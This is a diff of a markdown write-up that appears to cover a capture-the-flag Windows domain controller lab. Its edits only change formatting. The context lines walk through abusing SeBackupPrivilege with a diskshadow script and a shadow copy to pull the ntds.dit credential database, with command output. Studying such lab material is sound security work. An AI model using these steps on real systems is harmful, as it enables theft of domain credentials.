@@ -54,9 +54,12 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
 Important things to note based on Nmap's output:  
+
 * Domain name: `BLACKFIELD.LOCAL`
 * Host name: `DC01`
 * WinRM available (`5985`)
+
+<!-- -->
 
 Before proceed to enumerate the SMB and LDAP services, we should add `blackfield.local` & `dc01.blackfield.local` to our local DNS file (`/etc/hosts`).
 
@@ -296,7 +299,6 @@ Everyone                                   Well-known group S-1-1-0      Mandato
 BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
 <SNIP>
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -318,6 +320,8 @@ We can exploit the **SeBackupPrivilege** (*[Windows Privilege Escalation: SeBack
 - Move to a directory with write access
 - Expose the shadow copy
 - Download the `ntds.dit` database
+
+<!-- -->
 
 ```bash
 # write a diskshadow script
@@ -373,6 +377,8 @@ Querying all shadow copies with the shadow copy set ID {b33e3fe9-4ce7-481a-8ce7-
                 - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                 - Attributes:  No_Auto_Release Persistent No_Writers Differential
 
+<!-- -->
+
 Number of shadow copies listed: 1
 -> expose %random% z:
 -> %random% = {c1b9f0fc-55fe-4df8-b9d6-cc09d5be207a}
@@ -408,7 +414,6 @@ The shadow copy was successfully exposed as z:\.
    Files :         1         1         0         0         0         0
    Bytes :   18.00 m   18.00 m         0         0         0         0
    Times :   0:00:00   0:00:00                       0:00:00   0:00:00
-
 
    Speed :           109734697 Bytes/sec.
    Speed :            6279.069 MegaBytes/min.
